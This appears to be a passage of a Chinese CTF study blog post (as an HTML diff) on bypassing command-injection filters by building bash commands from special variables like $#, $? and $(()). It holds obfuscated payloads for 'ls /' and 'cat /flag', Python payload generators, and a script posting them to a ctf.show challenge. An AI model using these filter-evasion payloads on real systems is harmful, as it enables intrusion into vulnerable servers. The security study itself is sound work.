+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;&#x27;ls -l&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>却报错</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash: line 1: ls -l: command not found</span><br></pre></td></tr></table></figure>
+
+<p>看到这里我测试了一下，如下传参是可以执行的：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;ls /&quot;</span><br></pre></td></tr></table></figure>
+
+<p>我就在想为什么要这样在里面套一对单引号，本来以为是多此一举，想了一下，可能是构造出来的payload在转化完后就是这样的，事实胜于雄辩，直接构造一下看看结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /  ：$&#x27;\154\163\40\57&#x27;  这次这样构造一下</span><br><span class="line">相对应的二进制数为：0b10011010，0b10100011，0b101000 和 0b111001</span><br><span class="line">分别为 $&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$# $&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125; $&#123;##&#125;$#$&#123;##&#125;$#$#$# $&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;</span><br><span class="line">再二进制转十进制，如下：</span><br><span class="line">2:   $(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))</span><br><span class="line">154: $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))</span><br><span class="line">163: $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))</span><br><span class="line">40:  $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))</span><br><span class="line">57:  $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))</span><br></pre></td></tr></table></figure>
+
+<p>那么现在如下构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先完成最前面提出的问题，试试$&#x27;\154\163&#x27;能不能使用，如下：</span><br><span class="line">\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">结合前面的问题，如下测试：</span><br><span class="line">bash&lt;&lt;&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;  成功执行ls</span><br><span class="line"></span><br><span class="line">同时注意bash&lt;&lt;&lt;&quot;&#x27;ls&#x27;&quot; 也是可以执行的</span><br></pre></td></tr></table></figure>
+
+<p>这里说明了<code>$&#39;\154&#39;$&#39;\163&#39;</code>,个人发现的<code>$&#39;\154\163&#39;</code>都是可用的，虽然本来就是一样的。</p>
+<p>现在回到原先的问题，刚好证明了，这里使用更简单的构造，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt; $&#x27;\154\163\40\57&#x27;</span><br><span class="line">bash&lt;&lt;&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603150736801.png" alt="image-20240603150736801"></p>
+<p>这个事实就可以充分地说明在这个构造方法中最终利用的payload确实是如文章所说：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;&#x27;ls /&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>现在结合事实再来想想</strong>，估计就是因为在上面说过的最后结果会被当做字符串，这里为了与shell命令区分开，所以是<code>bash&lt;&lt;&lt;&quot;&#39;ls /&#39;&quot;</code>，中间的单引号表示的就是这是一个字符串，注意思考，区分<code>bash&lt;&lt;&lt;&quot;ls /&quot;</code>这两者的不同</p>
+<p><strong>那现在就继续跟文章</strong></p>
+<p>而出现这个结果的原因应该还是字符串问题，<strong>这阻止了<code>bash</code>用空格分隔参数，</strong></p>
+<p>我们只需使用上述方法运行<code>bash -c</code>，并将最终命令作为参数。这样，<strong>第二次 bash 调用就会进行参数分离</strong>。</p>
+<p>为了在<code>bash</code>和之间放置空格字符<code>-c</code>，我们使用括号扩展：<code>&#123;bash,-c&#125;</code>。这会扩展为带有空格的字符串。</p>
+<p>最终构造地paylaod：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&#123;bash，-c，ls -l&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>那么发散一下，也就是再调用一下bash嘛，那么我尝试再用一次<code>&lt;&lt;&lt;</code>呢</strong>，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))\&#x27;</span><br><span class="line">注意防止转义</span><br></pre></td></tr></table></figure>
+
+<p>成功执行，<strong>同时注意主要还是用这个</strong></p>
+<h4 id="其它的利用"><a href="#其它的利用" class="headerlink" title="其它的利用"></a>其它的利用</h4><p>其他的博主由此也提出了新的利用方法，参考<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-1">文章</a></p>
+<h5 id="shell脚本中-的多种用法"><a href="#shell脚本中-的多种用法" class="headerlink" title="shell脚本中$的多种用法"></a>shell脚本中$的多种用法</h5><p>shell脚本中<code>$</code>的多种用法（例子可参考<a href="https://blog.csdn.net/ly_qiu/article/details/105765772">文章</a>）：</p>
+<table>
+<thead>
+<tr>
+<th>变量名</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$0</td>
+<td>脚本本身的名字</td>
+</tr>
+<tr>
+<td>$1</td>
+<td>脚本后所输入的第一串字符</td>
+</tr>
+<tr>
+<td>$2</td>
+<td>传递给该shell脚本的第二个参数</td>
+</tr>
+<tr>
+<td>$*</td>
+<td>脚本后所输入的所有字符</td>
+</tr>
+<tr>
+<td>$@</td>
+<td>脚本后所输入的所有字符</td>
+</tr>
+<tr>
+<td>$_</td>
+<td>表示上一个命令的最后一个参数</td>
+</tr>
+<tr>
+<td>$#</td>
+<td>#脚本后所输入的字符串个数</td>
+</tr>
+<tr>
+<td>$$</td>
+<td>脚本运行的当前进程ID号</td>
+</tr>
+<tr>
+<td>$!</td>
+<td>表示最后执行的后台命令的PID</td>
+</tr>
+<tr>
+<td>$?</td>
+<td>显示最后命令的退出状态，0表示没有错误，其他表示有错误</td>
+</tr>
+</tbody></table>
+<h5 id="利用-构造"><a href="#利用-构造" class="headerlink" title="利用$#构造"></a>利用<code>$#</code>构造</h5><p>本质就是和上面启程部分说的那个一样，但是有可能<code>$&#123;!#&#125;</code>这种复杂变量不能通过php的system函数解析出来，可以将其换一种形式：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165448778.png" alt="image-20240603165448778"></p>
+<p>加了变量$__作为过渡，减少了解析的过程。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /flag</span><br><span class="line">__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以使用的脚本:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;#&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用-构造-1"><a href="#利用-构造-1" class="headerlink" title="利用 $(()) 构造"></a>利用 $(()) 构造</h5><p>这个刚刚好上面记录到有这个吗，可以使用<code>$(())</code>来构造任意数字</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0： $(())</span><br><span class="line">-1: $((~$(())))</span><br><span class="line">1:  $((~$((~$(($(())))$((~$(())))))))    </span><br><span class="line">2:  $(($((~$((~$(($(())))$((~$(())))))))&lt;&lt;$((~$((~$(($(())))$((~$(())))))))))     1&lt;&lt;1</span><br><span class="line">2：  $((~$(($((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<p>自己尝试按照<code>$#</code>那种方法来构造，比如ls</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br><span class="line"></span><br><span class="line">154二进制数 : 0b10011010</span><br><span class="line">163二进制数 : 0b10100011</span><br><span class="line"></span><br><span class="line">相对应的： $((~$((~$(($(())))$((~$(())))))))$(())$(())$((~$((~$(($(())))$((~$(())))))))$((~$((~$(($(())))$((~$(())))))))$(())$((~$((~$(($(())))$((~$(())))))))$(())</span><br><span class="line"></span><br><span class="line">$((~$((~$(($(())))$((~$(())))))))$(())$((~$((~$(($(())))$((~$(())))))))$(())$(())$(())$((~$((~$(($(())))$((~$(())))))))$((~$((~$(($(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<p>在终端输出看一下，均成功构造。不要构造了，到后面的加入<code>#</code>运用是错的，但还是可以自己去构造着试试。</p>
+<p>去看了一下<a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow的极限rce的level5</a>，茅塞顿开，<u>我的思维又局限了</u>，已经可以构造出来十进制的字符串了，还干嘛费心费力去转二进制然后回十进制，变通，<strong>强调脑子要变通</strong>，那么就如下构造一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">那现在需要的就是1、 5 、4 、6 、3</span><br><span class="line">-1：$((~$(())))</span><br><span class="line">1：$((~$((~$(($(())))$((~$(())))))))</span><br><span class="line">3：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">4: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">5: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">6: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<p>再传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>成功构造出：<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603191723486.png" alt="image-20240603191723486"></p>
+<p>这个同样有字符串那个问题，原因在本篇文章第一次提出这个问题给的参考那里有说，个人理解大概就是对于一个shell变量只进行一次，所以最后构造出来的<code>$&#39;&#39;</code>不会再运行。</p>
+<p>解决方法同样使用两次bash，先试试，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>然后传入成功执行<code>ls</code>，那么如何利用这个构造<code>bash</code>呢，不能只是简单的<code>$</code>+<code>$(())</code>，这样就算传进去也只会导致两个<code>$$</code>执行查看进程的命令，那么该如何构造呢，文章提出了思路：</p>
+<p>我们已知<code>$&#123;!#&#125;</code>输出为bash，结合间接引用<code>$&#123;!var&#125; -间接引用</code>的说明，在这里我们并没有对<code>#</code>这个赋值，却可以输出<code>bash</code>，那么我们是否可以猜测只要是没有值的参数，在这里都可以拿到<code>bash</code>这个输出，测试一下：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603203638487.png" alt="image-20240603203638487"></p>
+<p>在这张图片中，**可以看到<code>$&#123;!?&#125;</code>也是输出的<code>bash</code>**，虽然不知道为什么<code>$&#123;!0&#125;</code>没有输出（可能是因为是数字），但是可以采用第三个方法输出。这三个思路就是文章提出的，个人感觉还是挺精妙的</p>
+<p>所以在这里仅能通过<strong>定义一个<code>__=$(())</code>的方式将<code>__</code>变量的值设置为0</strong>，<strong>然后通过<code>$&#123;!__&#125;</code>的形式拿到<code>sh/bash</code>字符</strong>。两条命令间通过<code>&amp;&amp;(应该也可以使用 ; )</code>进行连接。由于bash的变量命名规范是以下划线或者英文字母开头，可以包含下划线和英文字母数字。所以这里是<code>__</code>作为变量名。</p>
+<p>最终<code>ls</code>的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__=$(());$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>wc，又是这个问题，宝塔linux本地只能用<code>bash</code>，换到centos跑一下：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204738674.png" alt="image-20240603204738674"></p>
+<p>成功执行，其他的payload构造也是同理。</p>
+<p>官方wp给了脚本（偷个懒），如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#level5</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://15a309e4-9e6d-4a18-8767-7be0a1efdfa9.challenge.ctf.show/&quot;</span></span><br><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">r = &#123;&#125;</span><br><span class="line"></span><br><span class="line">x=<span class="string">&#x27;$((~$(())))&#x27;</span><span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        r[i]=<span class="string">&#x27;$((~$((&#x27;</span>+x</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                r[i]+=x</span><br><span class="line">        r[i]+=<span class="string">&#x27;))))&#x27;</span></span><br><span class="line"></span><br><span class="line">r[<span class="number">0</span>]=<span class="string">&#x27;$(())&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]:</span><br><span class="line">                payload+=r[<span class="built_in">int</span>(i)]</span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=&#123;<span class="string">&quot;ctf_show&quot;</span>:payload,&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>来看看博主的方法</strong>，<code>$(())</code>对应0，使用自增构造出了1，2这两个数字。</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165230257.png" alt="image-20240603165230257"></p>
+<p>payload如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">cat</span> /flag</span></span><br><span class="line">__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>自增需要抓包后url编码传参</strong></p>
+<p>可以使用脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="利用-构造-2"><a href="#利用-构造-2" class="headerlink" title="利用 $? 构造"></a>利用 $? 构造</h5><p>正如上面说的，只要我们找到一个代表值为零的变量就可以得到bash进而继续构造，需要的值为<code>0</code>、<code>1</code>，2可以由<code>&lt;&lt;</code>得到</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603161335061.png" alt="image-20240603161335061"></p>
+<p>，这里只要最后的命令的推出状态没有错误就可以得到0，但是1就不能得到了，可以使用自增运算，如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /flag:</span><br><span class="line">__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>自增运算时传参需要url编码一下。</strong></p>
+<p>利用脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<p>自增等后面再来研究</p>
